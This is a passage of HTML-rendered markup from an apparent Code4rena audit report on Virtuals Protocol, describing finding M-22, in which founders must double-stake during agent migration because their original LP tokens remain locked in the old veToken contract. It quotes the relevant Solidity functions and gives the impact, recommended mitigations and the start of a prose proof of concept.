0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-170\"\u003e[M-22] Founder has to double-stake during migration with the initial LP locked in the old \u003ccode\u003eveToken\u003c/code\u003e\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-843\"\u003eoakcobalt\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-834\"\u003egkrastenov\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eDuring the migration process implemented in AgentMigrator.sol, founders face a double-staking problem where their original LP tokens remain locked in the old AgentVeToken contract while they must provide additional virtual tokens for the migration to the new system.\u003c/p\u003e\n\u003ch3 id=\"vulnerabilities-1\" style=\"position:relative;\"\u003e\u003ca href=\"#vulnerabilities-1\" aria-label=\"vulnerabilities 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eVulnerabilities\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eAgentMigrator.migrateAgent()\u003c/code\u003e function creates new token, LP, \u003ccode\u003eveToken\u003c/code\u003e, and DAO contracts but fails to provide a mechanism to migrate the founder’s locked tokens from the old \u003ccode\u003eveToken\u003c/code\u003e contract:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"109\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emigrateAgent\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy Agent token \u0026amp; LP\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_createNewAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eliquidityPools\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_assetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddInitialLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy AgentVeToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_createNewAgentVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econcat\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Staked \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ename\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estring\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econcat\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;s\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecanStake\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_nft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emigrateVirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edao\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Stake LP in new veToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentMigrator.sol#L107-L131\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentMigrator.sol#L107-L131\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMeanwhile, the original LP tokens remain locked in the old \u003ccode\u003eveToken\u003c/code\u003e due to the withdrawal restriction in \u003ccode\u003eAgentVeToken.withdraw()\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"110\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewithdraw\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enoReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_msgSender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Insufficient balance\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ((\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efounder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; ((\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematureAt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Not mature yet\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L99-L100\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentVeToken.sol#L99-L100\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"impact-16\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-16\" aria-label=\"impact 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eFounders must provide duplicate capital (virtual tokens) during migration, as they cannot retrieve their original LP tokens to retrieve originally deposited virtual tokens in the old uniswap pair.\u003c/li\u003e\n\u003cli\u003eOriginal LP tokens remain locked in obsolete contracts for 10 years. Due to the bonding curve graduation requirements and genesis requirements, the locked virtual token values are significant (roughly 35000 virtual tokens (35000 usd) required to graduate a bonding curve pair).\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eModify the AgentMigrator contract to include a mechanism to unlock LP tokens from the old \u003ccode\u003eveToken\u003c/code\u003e during migration.\u003c/li\u003e\n\u003cli\u003eAdd a privileged function to the AgentVeToken contract that allows the founder to withdraw their locked tokens in case of a migration.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"proof-of-concept-16\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-16\" aria-label=\"proof of concept 16 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eFounder deployed initial bonding curve.\u003c/li\u003e\n\u003cli\u003eIt requires roughly 35000 virtual tokens (35000 usd) to graduate and deploy agent tokens. At graduation, these are converted to LP tokens and locked in the original veToken, with the founder being unable to withdraw the \u003ccode\u003einitialLock\u003c/code\u003e 